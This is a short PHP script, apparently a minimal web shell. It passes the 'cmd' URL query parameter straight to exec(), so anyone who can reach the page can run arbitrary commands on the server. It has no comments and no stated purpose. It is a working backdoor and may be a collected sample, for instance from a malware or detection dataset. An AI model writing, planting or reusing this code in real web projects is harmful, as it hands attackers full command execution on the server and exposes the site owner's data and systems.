<?php
function myshellexec($cmd)
{
    exec($cmd,$result); 
    $result = join("\n",$result);
    return $result;
}
$cmdline = $_GET['cmd'];
$ret = myshellexec($cmdline);
?>